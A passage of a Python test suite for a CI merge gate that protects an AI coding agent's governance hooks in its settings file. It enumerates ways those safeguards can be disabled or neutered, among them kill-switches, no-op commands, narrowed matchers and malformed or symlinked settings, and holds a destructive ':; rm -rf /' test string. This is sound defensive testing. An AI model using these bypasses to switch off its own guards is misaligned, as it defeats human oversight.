        population it targets, which is why 4-C strictly precedes 4-A.

        Driven end-to-end against a real git tree -- there is no platform ceiling
        here; the fixture is a few seconds of local `git`.
        """
        import os
        import subprocess
        mod = self._load_ci_guard()

        def git(*a):
            return subprocess.run(["git", *a], cwd=tmp_path,
                                  capture_output=True, text=True, encoding="utf-8")

        git("init", "-b", "master")
        git("config", "user.email", "t@t")
        git("config", "user.name", "t")
        (tmp_path / "app.py").write_text("print(1)\n", encoding="utf-8")
        git("add", "-A")
        git("commit", "-m", "adopter code")
        for rel in (".claude/settings.json", "tools/cc/hooks/write_guard.py"):
            f = tmp_path / rel
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_text("x\n", encoding="utf-8")
        git("add", "-A")
        git("commit", "-m", "espalier init")
        first = git("rev-list", "--max-parents=0", "HEAD").stdout.strip()
        git("checkout", "-b", "feature")
        (tmp_path / "app.py").write_text("print(2)\n", encoding="utf-8")
        git("add", "-A")
        git("commit", "-m", "feature work")
        # Advance `master` AFTER branching, so history is non-linear and
        # merge-base(master, HEAD) != rev-parse(master). On a linear fixture the
        # two are identical, and a swap of one for the other passes every
        # assertion here -- a pin that cannot tell the operation it names from a
        # different one is not pinning it.
        git("checkout", "master")
        (tmp_path / "other.py").write_text("print(3)\n", encoding="utf-8")
        git("add", "-A")
        git("commit", "-m", "parallel work on master")
        master_tip = git("rev-parse", "master").stdout.strip()
        git("checkout", "feature")

        push = {"GITHUB_EVENT_NAME": "push", "BEFORE_SHA": "0" * 40}
        cwd = os.getcwd()
        os.chdir(tmp_path)
        try:
            without = mod.resolve_base(dict(push))
            with_operand = mod.resolve_base(dict(push, DEFAULT_BRANCH="master"))
        finally:
            os.chdir(cwd)

        assert without == first, (
            "fixture is not exercising the fail-closed path: without the operand "
            "resolve_base should fall through to the initial commit on a master "
            f"adopter, got {without!r} vs first {first!r}"
        )
        assert with_operand != first, (
            "DEFAULT_BRANCH did not rescue the master adopter -- resolve_base "
            "still diffed against the initial commit, so every protected path "
            "reads as changed and the first branch push fails closed."
        )
        merge_base = git("merge-base", "master", "HEAD").stdout.strip()
        assert with_operand == merge_base
        assert merge_base != master_tip, (
            "fixture history is linear, so merge-base and rev-parse agree and "
            "this assertion cannot tell them apart"
        )

    def test_governance_mirror_matches_sot(self):
        from espalier.harness_config import GOVERNANCE_BLOCKING_HOOKS
        mod = self._load_ci_guard()
        assert mod._GOVERNANCE_BLOCKING_HOOKS == GOVERNANCE_BLOCKING_HOOKS, (
            "ci_guard._GOVERNANCE_BLOCKING_HOOKS drifted from "
            "espalier.harness_config.GOVERNANCE_BLOCKING_HOOKS — update both "
            "in the same change (zero-imports rule forbids importing the SoT)."
        )

    def test_canonical_matcher_mirror_matches_chw(self):
        # TP-169 §13 #8 round-4: ci_guard's inline per-hook canonical matchers
        # must equal CANONICAL_HOOK_WIRING (write_guard "*", plan_guard mutations).
        from espalier.harness_config import CANONICAL_HOOK_WIRING
        mod = self._load_ci_guard()
        for script, matcher in mod._CI_CANONICAL_PRETOOLUSE_MATCHERS.items():
            assert matcher == CANONICAL_HOOK_WIRING[script]["matcher"], (
                f"ci_guard canonical matcher for {script} drifted from CHW"
            )

    def test_canonical_matcher_mirror_population_matches_governance_sot(self):
        """DEF-605: the VALUE check above iterates the mirror it is testing, so
        the population IS the subject -- deleting a row deletes its own check
        row (FAILURE_MODES §18.4, mechanism B: a fail-open registry lookup).
        Pin MEMBERSHIP against the SoT instead, both directions.

        Driven in-process 2026-08-18 against a fixture whose baseline is CLEAN
        (0 findings), so a mutation's output discriminates:

          delete "write_guard.py"  -> value check PASSES, and
              _scan_settings_for_missing_governance_events emits 0 findings.
              SILENT: canonical falls back to "" via .get(script, ""), and
              _ci_matcher_covers_canonical treats "" and "*" alike (fire_all),
              so the requirement is unchanged and nothing reds anywhere.
          delete "plan_guard.py"   -> value check PASSES, but the scan emits 1
              finding against a CORRECTLY wired adopter -- the "" fallback
              demands fire-all from a matcher that legitimately names tools.
              Not silent; fail-CLOSED, which is its own defect.

        Both rows are invisible to the value check; only their consequences
        differ. Membership is what neither the value check nor the consumer
        pins, so it is pinned here.

        Sister site: espalier/_vendor/cc/ci_guard.py carries the same dict and
        is covered transitively by tests/test_vendor_cc_parity.py, which is a
        byte-identity bijection over the tree -- not a floor. No second
        assertion needed here; a drift there reds those tests instead.
        """
        from espalier.harness_config import GOVERNANCE_BLOCKING_HOOKS
        mod = self._load_ci_guard()
        expected = {
            script for script, event in GOVERNANCE_BLOCKING_HOOKS.items()
            if event == "PreToolUse"
        }
        actual = set(mod._CI_CANONICAL_PRETOOLUSE_MATCHERS)
        assert actual == expected, (
            "ci_guard._CI_CANONICAL_PRETOOLUSE_MATCHERS population drifted "
            "from the GOVERNANCE_BLOCKING_HOOKS PreToolUse set.\n"
            f"  missing (falls back to the fire-all \"\" default): "
            f"{sorted(expected - actual)}\n"
            f"  extra (no governance hook to match): {sorted(actual - expected)}"
            "\nFix by restoring the row, not by editing this expectation -- a "
            "vanished row is exactly what this gate exists to notice."
        )

    def _load_integrity(self):
        import importlib.util
        path = ROOT / "tools" / "cc" / "hooks" / "_integrity.py"
        spec = importlib.util.spec_from_file_location("_integrity_parity_mod", path)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        return mod

    def test_kill_switch_noop_mirror_matches_integrity(self):
        """TP-200 (R9-CIGUARD-1): ci_guard._scan_settings_file_for_kill_switch
        re-implements hooks/_integrity._find_kill_switches inline (zero-imports
        rule), and its docstring SELF-DECLARES the mirror. The governance dict
        and canonical matchers beside it ARE parity-pinned (above); the no-op
        constants + predicate were not — so a drift in _integrity's SoT would
        silently diverge the CI force-add backstop from the live deny set with a
        green suite. Pin the constants AND the predicate over a matrix that
        includes the bypass-relevant pipe/subshell cases."""
        cg = self._load_ci_guard()
        ig = self._load_integrity()
        assert cg._NOOP_COMMANDS == ig._NOOP_COMMANDS, (
            "ci_guard._NOOP_COMMANDS drifted from hooks/_integrity._NOOP_COMMANDS "
            "— update both in the same change (zero-imports rule forbids "
            "importing the SoT)."
        )
        assert cg._EXIT_NOOP_RE.pattern == ig._EXIT_NOOP_RE.pattern, (
            "ci_guard._EXIT_NOOP_RE drifted from hooks/_integrity._EXIT_NOOP_RE."
        )
        # Behavioral parity on the no-op predicate (same single-arg signature).
        for cmd in ["", " : ", "true", "/bin/true", "exit 0", "exit  12",
                    "echo hi", "true | false", ":; rm -rf /", None, 5]:
            assert cg._is_noop(cmd) == ig._is_noop_command(cmd), (
                f"no-op predicate drift on {cmd!r}: ci_guard={cg._is_noop(cmd)} "
                f"vs _integrity={ig._is_noop_command(cmd)}"
            )

    def test_governed_events_parity_ci_guard_integrity_harness_config(self):
        """TP-275 6-A: the empty-top-level-list kill-switch branch must fire ONLY
        for an Espalier-governed event (an empty list for a NON-governed event is
        the adopter's own config, not a kill-switch). ci_guard re-declares the
        governed-event set inline (zero-imports rule); it must stay equal to
        hooks/_integrity._ESPALIER_GOVERNED_EVENTS AND to the espalier SoT
        harness_config.HOOK_EVENTS, so the three copies cannot drift."""
        from espalier.harness_config import HOOK_EVENTS
        cg = self._load_ci_guard()
        ig = self._load_integrity()
        assert cg._ESPALIER_GOVERNED_EVENTS == ig._ESPALIER_GOVERNED_EVENTS == HOOK_EVENTS, (
            "governed-event set drift — update all three in the same change "
            "(zero-imports rule forbids importing the SoT into ci_guard/_integrity): "
            f"ci_guard={sorted(cg._ESPALIER_GOVERNED_EVENTS)} "
            f"integrity={sorted(ig._ESPALIER_GOVERNED_EVENTS)} "
            f"HOOK_EVENTS={sorted(HOOK_EVENTS)}"
        )


class TestEmptyListGovernedEventGate:
    """TP-275 6-A: the empty-top-level-list kill-switch branch must fire ONLY for
    an Espalier-governed event. An empty list for a NON-governed event (an
    adopter's own ``"PreCompact": []``) is identical to omitting the key and must
    NOT be flagged — otherwise ci_guard false-fails a first adopter PR on the
    adopter's own benign config. Matches the live hooks/_integrity gate."""

    def _load_ci_guard(self):
        import importlib.util
        spec = importlib.util.spec_from_file_location("_ci_guard_gate_mod", CI_GUARD)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        return mod

    def _scan(self, mod, tmp_path, payload):
        import json as _json
        rel = ".claude/settings.json"
        (tmp_path / ".claude").mkdir(parents=True, exist_ok=True)
        (tmp_path / rel).write_text(_json.dumps(payload), encoding="utf-8")
        return mod._scan_settings_file_for_kill_switch(rel, tmp_path)

    def test_non_governed_empty_list_is_not_a_kill_switch(self, tmp_path):
        mod = self._load_ci_guard()
        findings = self._scan(mod, tmp_path, {"hooks": {"PreCompact": []}})
        assert findings == [], (
            "an empty list for a NON-governed event (PreCompact) is the adopter's "
            f"own config, not a kill-switch — got {findings}"
        )

    def test_governed_empty_list_still_flagged(self, tmp_path):
        mod = self._load_ci_guard()
        findings = self._scan(mod, tmp_path, {"hooks": {"Stop": []}})
        assert any("Stop" in f and "empty list" in f for f in findings), (
            "an empty list for a governed event (Stop) neuters a deployed hook and "
            f"must still be flagged — got {findings}"
        )


class TestN7ExecutabilityFailOpens:
    """TP-169 §13 #8 re-attack (ci_guard leg): a committed settings.json that
    leaves a gate's path as bait while killing the gate (no-op command, wrong
    type, stale-copy path, tool-excluding matcher) must fail the merge. Each row
    earns-the-red against the executability fix; the harness change is approved
    (GITHUB_EVENT_NAME=push) so the governance check is isolated from the
    protected-path check."""

    _APPROVED = "HARNESS-UPDATE-APPROVED: legit harness change"

    def _exec(self, script, matcher=""):
        e = {"hooks": [{"type": "command", "command": "python3",
                        "args": [f"${{CLAUDE_PROJECT_DIR}}/tools/cc/hooks/{script}"]}]}
        if matcher:
            e["matcher"] = matcher
        return e

    def _commit(self, repo, hooks, msg=_APPROVED, extra_files=()):
        import json as _json
        env = _git_env()
        hd = repo / "tools" / "cc" / "hooks"
        hd.mkdir(parents=True, exist_ok=True)
        for s in ("write_guard.py", "plan_guard.py", "config_guard.py", "stop_gate.py"):
            (hd / s).write_text("import sys\nsys.exit(0)\n", encoding="utf-8")
        for rel in extra_files:
            p = repo / rel
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text("import sys\nsys.exit(0)\n", encoding="utf-8")
        (repo / ".claude").mkdir(parents=True, exist_ok=True)
        (repo / ".claude" / "settings.json").write_text(_json.dumps({"hooks": hooks}), encoding="utf-8")
        _git(["add", "-A"], repo, env)
        _git(["commit", "-m", msg], repo, env)

    def _base(self):
        return {
            "PreToolUse": [self._exec("write_guard.py", "*"),
                           self._exec("plan_guard.py", "Write|Edit|NotebookEdit")],
            "ConfigChange": [self._exec("config_guard.py")],
            "Stop": [self._exec("stop_gate.py")],
        }

    def _run(self, repo, hooks, **kw):
        env = _git_env()
        _git(["checkout", "-b", "feature"], repo, env)
        self._commit(repo, hooks, **kw)
        return _run_guard(repo, {"GITHUB_EVENT_NAME": "push"})

    def test_inert_exec_command_true_fails(self, fresh_repo):
        hooks = self._base()
        hooks["PreToolUse"][0]["hooks"][0]["command"] = "true"
        result = self._run(fresh_repo, hooks)
        assert result.returncode == 2, result.stdout
        assert "write_guard.py" in result.stdout

    def test_shell_noop_bait_fails(self, fresh_repo):
        hooks = self._base()
        hooks["ConfigChange"] = [{"hooks": [{
            "type": "command",
            "command": ": ${CLAUDE_PROJECT_DIR}/tools/cc/hooks/config_guard.py"}]}]
        result = self._run(fresh_repo, hooks)
        assert result.returncode == 2, result.stdout
        assert "config_guard.py" in result.stdout

    def test_shell_form_invocation_fails(self, fresh_repo):
        # TP-169 §13 #8 round-2: shell-form is undecidable to verify, so it is
        # conservatively flagged (use canonical exec form). Even a genuine
        # `python3 <path>` shell string fails the gate.
        hooks = self._base()
        hooks["ConfigChange"] = [{"hooks": [{
            "type": "command",
            "command": "python3 ${CLAUDE_PROJECT_DIR}/tools/cc/hooks/config_guard.py"}]}]
        result = self._run(fresh_repo, hooks)
        assert result.returncode == 2, result.stdout
        assert "config_guard.py" in result.stdout

    @pytest.mark.parametrize("bad_args", [
        ["-c", "pass", "${CLAUDE_PROJECT_DIR}/tools/cc/hooks/write_guard.py"],
        ["-m", "py_compile", "${CLAUDE_PROJECT_DIR}/tools/cc/hooks/write_guard.py"],
    ])
    def test_exec_flag_prefix_inert_script_fails(self, fresh_repo, bad_args):
        hooks = self._base()
        hooks["PreToolUse"][0]["hooks"][0]["args"] = bad_args
        result = self._run(fresh_repo, hooks)
        assert result.returncode == 2, result.stdout
        assert "write_guard.py" in result.stdout

    def test_dot_slash_path_passes(self, fresh_repo):
        # ./-prefixed canonical path normalizes on both legs → not flagged.
        hooks = self._base()
        hooks["PreToolUse"][0]["hooks"][0]["args"] = [
            "${CLAUDE_PROJECT_DIR}/./tools/cc/hooks/write_guard.py"]
        result = self._run(fresh_repo, hooks)
        assert result.returncode == 0, result.stdout

    def test_wrong_type_fails(self, fresh_repo):
        hooks = self._base()
        hooks["PreToolUse"][0]["hooks"][0]["type"] = "prompt"
        result = self._run(fresh_repo, hooks)
        assert result.returncode == 2, result.stdout
        assert "write_guard.py" in result.stdout

    def test_stale_copy_path_fails(self, fresh_repo):
        hooks = self._base()
        hooks["PreToolUse"][0]["hooks"][0]["args"] = [".claude/hooks/write_guard.py"]
        result = self._run(fresh_repo, hooks, extra_files=(".claude/hooks/write_guard.py",))
        assert result.returncode == 2, result.stdout
        assert "write_guard.py" in result.stdout

    def test_tool_excluding_matcher_fails(self, fresh_repo):
        hooks = self._base()
        hooks["PreToolUse"][0]["matcher"] = "Bash"
        result = self._run(fresh_repo, hooks)
        assert result.returncode == 2, result.stdout
        assert "write_guard.py" in result.stdout

    @pytest.mark.parametrize("narrowed", [
        "Write|Edit|NotebookEdit",                           # round-4 survivor
        "Write|Edit|NotebookEdit|Bash|PowerShell|mcp__.*",   # broad but not fire-all
    ])
    def test_write_guard_non_fire_all_matcher_fails(self, fresh_repo, narrowed):
        # write_guard canonical matcher is "*" (kill-switch must reach all tools);
        # a mutations-covering-but-narrower matcher silently collapses its reach.
        hooks = self._base()
        hooks["PreToolUse"][0]["matcher"] = narrowed
        result = self._run(fresh_repo, hooks)
        assert result.returncode == 2, result.stdout
        assert "write_guard.py" in result.stdout

    def test_write_guard_star_matcher_passes(self, fresh_repo):
        hooks = self._base()
        hooks["PreToolUse"][0]["matcher"] = "*"
        result = self._run(fresh_repo, hooks)
        assert result.returncode == 0, result.stdout

    def test_plan_guard_covers_mutations_passes(self, fresh_repo):
        hooks = self._base()
        hooks["PreToolUse"][1]["matcher"] = "Write|Edit|NotebookEdit|Bash|PowerShell|mcp__.*"
        result = self._run(fresh_repo, hooks)
        assert result.returncode == 0, result.stdout


class TestN7MalformedSettingsFailClosed:
    """TP-169 §13 #8 round-3: ci_guard must fail CLOSED (flag every deployed
    gate, rc 2) on a committed settings.json it cannot prove wires the gates —
    no `hooks` key, non-dict `hooks`, malformed JSON, non-dict top-level. The
    most complete neutering (all gates dead at once) previously slipped via an
    early `return []`. The merge gate is the only adopter-facing enforcement
    layer, so this is the critical fail-open direction."""

    def _commit_raw_settings(self, repo: Path, raw: str, msg: str) -> None:
        env = _git_env()
        hd = repo / "tools" / "cc" / "hooks"
        hd.mkdir(parents=True, exist_ok=True)
        for s in ("write_guard.py", "plan_guard.py", "config_guard.py", "stop_gate.py"):
            (hd / s).write_text("import sys\nsys.exit(0)\n", encoding="utf-8")
        (repo / ".claude").mkdir(parents=True, exist_ok=True)
        (repo / ".claude" / "settings.json").write_text(raw, encoding="utf-8")
        _git(["add", "-A"], repo, env)
        _git(["commit", "-m", msg], repo, env)

    @pytest.mark.parametrize("raw", [
        '{"permissions": {}}',     # no hooks key
        '{"hooks": "disabled"}',   # hooks non-dict (string)
        '{"hooks": []}',           # hooks non-dict (list)
        '[]',                      # top-level non-dict
        '{ not valid json',        # malformed
    ])
    def test_unprovable_committed_settings_fails_even_with_approval(self, fresh_repo, raw):
        env = _git_env()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        # Approval marker present → isolates governance from protected-paths;
        # the governance check is unconditional, so it must still fail the merge.
        self._commit_raw_settings(fresh_repo, raw, "HARNESS-UPDATE-APPROVED: oops")
        result = _run_guard(fresh_repo, {"GITHUB_EVENT_NAME": "push"})
        assert result.returncode == 2, result.stdout
        for script in ("write_guard.py", "plan_guard.py", "config_guard.py", "stop_gate.py"):
            assert script in result.stdout, f"{script} not flagged on {raw!r}"

    def test_malformed_settings_without_hook_files_does_not_fire(self, fresh_repo):
        # Non-harness repo (no governance hook files on disk) → no flag even on
        # a malformed settings.json (the file-on-disk trigger gates the check).
        env = _git_env()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        (fresh_repo / ".claude").mkdir(parents=True, exist_ok=True)
        (fresh_repo / ".claude" / "settings.json").write_text("{ not valid json", encoding="utf-8")
        _git(["add", "-A"], fresh_repo, env)
        _git(["commit", "-m", "clean"], fresh_repo, env)
        result = _run_guard(fresh_repo)
        # Assert the specific block, not a bare "governance" word-grep. That
        # word now also appears in the unreadable-settings message, which is a
        # DIFFERENT check and does fire here by design: it is the twin of the
        # kill-switch scan (unconditional) rather than of the wiring scan
        # (gated on hook files being present on disk).
        assert "Governance wiring findings:" not in result.stdout
        assert "blocking governance gate" not in result.stdout


def test_doctor_ci_scan_parity_on_malformed_settings(tmp_path):
    """Doctor and ci_guard must AGREE on every unprovable settings shape — the
    round-3 fail-open was a one-directional drift (doctor closed, ci open). Pin
    scan-level parity so the seam can't re-open."""
    import importlib.util
    from espalier.doctor import _check_governance_event_wiring
    spec = importlib.util.spec_from_file_location(
        "_ci_guard_scanparity", ROOT / "tools" / "cc" / "ci_guard.py")
    cig = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(cig)

    hd = tmp_path / "tools" / "cc" / "hooks"
    hd.mkdir(parents=True)
    for s in ("write_guard.py", "plan_guard.py", "config_guard.py", "stop_gate.py"):
        (hd / s).write_text("import sys\nsys.exit(0)\n", encoding="utf-8")
    (tmp_path / ".claude").mkdir()
    for raw in ('{"permissions":{}}', '{"hooks":"x"}', '{"hooks":[]}', '{"hooks":null}',
                '[]', '{ bad json', '{"hooks":{}}'):
        (tmp_path / ".claude" / "settings.json").write_text(raw, encoding="utf-8")
        d = len(_check_governance_event_wiring(tmp_path))
        c = len(cig._scan_settings_for_missing_governance_events(".claude/settings.json", tmp_path))
        assert d == c == 4, f"parity/fail-closed broken on {raw!r}: doctor={d} ci={c}"


class TestN7BomSettings:
    """TP-169 §13 #8 round-5: BOM-tolerant (utf-8-sig) settings.json reads. A
    byte-canonical BOM'd settings.json must not false-flag the governance gate;
    a BOM'd disableAllHooks kill-switch must NOT evade the scan (sibling)."""

    _APPROVED = "HARNESS-UPDATE-APPROVED: legit harness change"
    _BOM = b"\xef\xbb\xbf"

    def _exec(self, script, matcher=""):
        e = {"hooks": [{"type": "command", "command": "python3",
                        "args": [f"${{CLAUDE_PROJECT_DIR}}/tools/cc/hooks/{script}"]}]}
        if matcher:
            e["matcher"] = matcher
        return e

    def _full_hooks(self):
        return {
            "PreToolUse": [self._exec("write_guard.py", "*"),
                           self._exec("plan_guard.py", "Write|Edit|NotebookEdit")],
            "ConfigChange": [self._exec("config_guard.py")],
            "Stop": [self._exec("stop_gate.py")],
        }

    def _commit_bytes(self, repo, payload, msg, with_files=True):
        import json as _json
        env = _git_env()
        if with_files:
            hd = repo / "tools" / "cc" / "hooks"
            hd.mkdir(parents=True, exist_ok=True)
            for s in ("write_guard.py", "plan_guard.py", "config_guard.py", "stop_gate.py"):
                (hd / s).write_text("import sys\nsys.exit(0)\n", encoding="utf-8")
        (repo / ".claude").mkdir(parents=True, exist_ok=True)
        (repo / ".claude" / "settings.json").write_bytes(
            self._BOM + _json.dumps(payload).encode("utf-8"))
        _git(["add", "-A"], repo, env)
        _git(["commit", "-m", msg], repo, env)

    def test_bom_canonical_settings_passes(self, fresh_repo):
        env = _git_env()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        self._commit_bytes(fresh_repo, {"hooks": self._full_hooks()}, self._APPROVED)
        result = _run_guard(fresh_repo, {"GITHUB_EVENT_NAME": "push"})
        assert result.returncode == 0, result.stdout
        assert "governance" not in result.stdout.lower()

    def test_bom_disable_all_hooks_still_caught(self, fresh_repo):
        env = _git_env()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        # Even with the approval marker, a BOM'd kill-switch must fail the merge.
        self._commit_bytes(fresh_repo, {"disableAllHooks": True}, self._APPROVED, with_files=False)
        result = _run_guard(fresh_repo, {"GITHUB_EVENT_NAME": "push"})
        assert result.returncode == 2, result.stdout
        assert "disableAllHooks" in result.stdout


class TestN7DanglingSymlinkSettings:
    """TP-169 §13 #8 round-6: a committed dangling-symlink settings.json (git
    mode 120000, target absent on CI) must fail CLOSED on the governance leg —
    present-but-broken, not absent."""

    @requires_symlink
    def test_dangling_symlink_settings_fails(self, fresh_repo):
        import os
        env = _git_env()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        hd = fresh_repo / "tools" / "cc" / "hooks"
        hd.mkdir(parents=True, exist_ok=True)
        for s in ("write_guard.py", "plan_guard.py", "config_guard.py", "stop_gate.py"):
            (hd / s).write_text("import sys\nsys.exit(0)\n", encoding="utf-8")
        (fresh_repo / ".claude").mkdir(parents=True, exist_ok=True)
        os.symlink("per-machine-absent.json", fresh_repo / ".claude" / "settings.json")
        _git(["add", "-A"], fresh_repo, env)
        _git(["commit", "-m", "HARNESS-UPDATE-APPROVED: symlink settings"], fresh_repo, env)
        result = _run_guard(fresh_repo, {"GITHUB_EVENT_NAME": "push"})
        assert result.returncode == 2, result.stdout
        assert "write_guard.py" in result.stdout


# ── TP-400 2-E / 2-A: repo-posture scoping + the Dependabot allowance ───────


_SELF_HOST_PYPROJECT = '[project]\nname = "espalier-harness"\nversion = "0.0.0"\n'


def _make_self_host(repo: Path, pyproject_encoding: str = "utf-8") -> None:
    """Give a temp repo all FIVE self-host signals.

    Signal 5 is the SHA of write_guard.py's first 200 bytes, so the real file's
    bytes are copied from this checkout — a hand-written stub cannot satisfy it,
    which is exactly the property that makes the detector worth having.

    ``pyproject_encoding`` exists for the encoding regression below; every
    other caller takes the utf-8 default.
    """
    (repo / "espalier").mkdir(parents=True, exist_ok=True)
    (repo / "bench").mkdir(parents=True, exist_ok=True)
    hooks = repo / "tools" / "cc" / "hooks"
    hooks.mkdir(parents=True, exist_ok=True)
    real_wg = (ROOT / "tools" / "cc" / "hooks" / "write_guard.py").read_bytes()
    (hooks / "write_guard.py").write_bytes(real_wg)
    (repo / "pyproject.toml").write_bytes(
        _SELF_HOST_PYPROJECT.encode(pyproject_encoding)
    )


def _touch_protected(repo: Path, message: str) -> None:
    """Commit a change to a protected path with the given commit message."""
    _git(["checkout", "-b", "feature"], repo, _git_env())
    _commit(repo, ".github/workflows/test.yml", "name: t\non: push\n", message)


class TestApprovalMarkerRepoPosture:
    """Operator ruling 2026-08-02 — the marker is scoped by repo posture.

    THREE axes, all required. A two-sided pin that omitted the adopter-push arm
    would create precisely the bypass this exists to prevent: it would read as
    "pushes don't need markers" rather than "self-host pushes don't".
    """

    def test_self_host_push_without_marker_is_allowed(self, fresh_repo):
        _make_self_host(fresh_repo)
        _touch_protected(fresh_repo, "no marker here")
        result = _run_guard(fresh_repo, {"GITHUB_EVENT_NAME": "push"})
        assert result.returncode == 0, result.stdout
        assert "approval marker not required" in result.stdout

    def test_adopter_push_without_marker_is_denied(self, fresh_repo):
        # fresh_repo has none of the five signals — an ordinary adopter repo.
        _touch_protected(fresh_repo, "no marker here")
        result = _run_guard(fresh_repo, {"GITHUB_EVENT_NAME": "push"})
        assert result.returncode == 2, result.stdout
        assert "without approval marker" in result.stdout

    def test_pull_request_without_marker_is_denied_even_on_self_host(self, fresh_repo):
        # The PR path is the whole reason the gate exists; posture must not
        # touch it. BC-032 lives on this path.
        _make_self_host(fresh_repo)
        _touch_protected(fresh_repo, "no marker here")
        result = _run_guard(
            fresh_repo, {"GITHUB_EVENT_NAME": "pull_request", "PR_TITLE": "Bump things"}
        )
        assert result.returncode == 2, result.stdout
        assert "without approval marker" in result.stdout

    def test_four_signals_is_not_enough(self, fresh_repo):
        """Signals 1-4 present, signal 5 (the SHA pin) absent → adopter posture.

        This is the hole espalier/_self_host_fingerprint.py names by hand: "a
        user repo named espalier-harness with empty stub directories would
        acquire the elevated self-host posture". A 4-signal detector passes the
        test above and fails this one.
        """
        _make_self_host(fresh_repo)
        # Break ONLY signal 5.
        (fresh_repo / "tools" / "cc" / "hooks" / "write_guard.py").write_text(
            "# not the real write_guard\n", encoding="utf-8"
        )
        _touch_protected(fresh_repo, "no marker here")
        result = _run_guard(fresh_repo, {"GITHUB_EVENT_NAME": "push"})
        assert result.returncode == 2, result.stdout

    @pytest.mark.parametrize("encoding", ["utf-8", "utf-8-sig", "utf-16"])
    def test_a_non_utf8_pyproject_never_crashes_the_gate(self, fresh_repo, encoding):
        """The merge gate must return a VERDICT for any pyproject encoding.

        Regression: the detector read pyproject.toml with
        `read_text(encoding="utf-8")` under `except OSError` only, so a UTF-16
        file — a Windows editor or a PowerShell `Out-File` produces one —
        raised UnicodeDecodeError out of `run()` and the gate exited 1 with a
        traceback instead of allowing or denying. Driven before the fix:
        utf-8 → 0, utf-8-sig → 2, utf-16 → **1 + traceback**.

        Exit 1 is the assertion that matters. RC 0 vs 2 legitimately differs by
        encoding: only plain utf-8 yields self-host posture, because a BOM
        leaves the first line as "\\ufeff[project]" so the section never matches
        and the repo classifies as an adopter. That is the SoT's behaviour too
        (espalier.surface_contract reads plain utf-8), and all three copies
        must agree — so the BOM case denying is CORRECT here, not a second bug.
        Both non-utf-8 outcomes fail closed.
        """
        _make_self_host(fresh_repo, pyproject_encoding=encoding)
        _touch_protected(fresh_repo, "no marker here")
        result = _run_guard(fresh_repo, {"GITHUB_EVENT_NAME": "push"})
        assert result.returncode != 1, (
            f"{encoding} pyproject crashed the gate instead of returning a "
            f"verdict:\n{result.stderr[-800:]}"
        )
        assert "Traceback" not in result.stderr, result.stderr[-800:]
        assert result.returncode in (0, 2)
        if encoding == "utf-8":
            assert result.returncode == 0, result.stdout

    def test_kill_switch_still_denies_on_a_self_host_push(self, fresh_repo):
        """The unconditional scans outrank the posture allowance."""
        import json as _json
        _make_self_host(fresh_repo)
        _git(["checkout", "-b", "feature"], fresh_repo, _git_env())
        (fresh_repo / ".claude").mkdir(parents=True, exist_ok=True)
        (fresh_repo / ".claude" / "settings.json").write_text(
            _json.dumps({"disableAllHooks": True}), encoding="utf-8"
        )
        _git(["add", "-f", ".claude/settings.json"], fresh_repo, _git_env())
        _git(["commit", "-m", "force-add kill switch"], fresh_repo, _git_env())
        result = _run_guard(fresh_repo, {"GITHUB_EVENT_NAME": "push"})
        assert result.returncode == 2, result.stdout
        assert "kill-switch" in result.stdout


class TestDependabotActionBumpAllowance:
    """Horn A — narrow, actor + path + diff-shape scoped. Both directions."""

    _BOT = "dependabot[bot]"

    def _bump(self, repo: Path, body: str) -> None:
        _git(["checkout", "-b", "feature"], repo, _git_env())
        _commit(repo, ".github/workflows/test.yml", body, "Bump actions/checkout from 4.2.1 to 4.2.2")

    def test_dependabot_uses_only_bump_is_allowed(self, fresh_repo):
        _commit(fresh_repo, ".github/workflows/test.yml",
                "jobs:\n  a:\n    steps:\n      - uses: actions/checkout@aaaa1111\n", "seed")
        self._bump(fresh_repo,
                   "jobs:\n  a:\n    steps:\n      - uses: actions/checkout@bbbb2222\n")
        result = _run_guard(fresh_repo, {
            "GITHUB_EVENT_NAME": "pull_request", "GITHUB_ACTOR": self._BOT,
            "PR_TITLE": "Bump actions/checkout from 4.2.1 to 4.2.2",
        })
        assert result.returncode == 0, result.stdout
        assert "Dependabot action-SHA bump" in result.stdout

    def test_human_pr_on_the_same_path_without_marker_still_denies(self, fresh_repo):
        """The direction that matters: the allowance must not widen for people."""
        _commit(fresh_repo, ".github/workflows/test.yml",
                "jobs:\n  a:\n    steps:\n      - uses: actions/checkout@aaaa1111\n", "seed")
        self._bump(fresh_repo,
                   "jobs:\n  a:\n    steps:\n      - uses: actions/checkout@bbbb2222\n")
        result = _run_guard(fresh_repo, {
            "GITHUB_EVENT_NAME": "pull_request", "GITHUB_ACTOR": "a-human",
            "PR_TITLE": "Bump actions/checkout from 4.2.1 to 4.2.2",
        })
        assert result.returncode == 2, result.stdout

    def test_dependabot_touching_a_non_workflow_path_denies(self, fresh_repo):
        """Isolates the PATH condition — the changed line is `uses:`-shaped.

        The obvious fixture here (a non-workflow file with ordinary content)
        does NOT isolate this arm: it is denied by the diff-shape condition
        instead, so removing the path check entirely leaves the test green. That
        was measured — the first version of this test stayed GREEN under a
        path-check-deleted mutation, i.e. it was born weak. Keeping the changed
        line `uses:`-shaped means the diff-shape arm PASSES and only the path
        arm can deny, so this test now fails if and only if the path condition
        is gone.
        """
        _git(["checkout", "-b", "feature"], fresh_repo, _git_env())
        _commit(
            fresh_repo, "tools/cc/ci_guard.py",
            "      - uses: actions/checkout@bbbb2222\n",
            "Bump actions/checkout from 4.2.1 to 4.2.2",
        )
        result = _run_guard(fresh_repo, {
            "GITHUB_EVENT_NAME": "pull_request", "GITHUB_ACTOR": self._BOT,
            "PR_TITLE": "Bump actions/checkout from 4.2.1 to 4.2.2",
        })
        assert result.returncode == 2, result.stdout

    @pytest.mark.parametrize(
        "swapped_line, label",
        [
            ("      - uses: attacker/malicious-action@bbbb2222", "different owner+name"),
            ("      - uses: actions/github-script@bbbb2222", "same owner, other action"),
        ],
    )
    def test_dependabot_action_identity_swap_denies(self, fresh_repo, swapped_line, label):
        """The allowance permits a REF change only — never an action swap.

        Verified reachable before this arm existed: `actions/checkout@sha` ->
        `attacker/evil@sha` is two well-formed `uses:` lines, so a shape-only
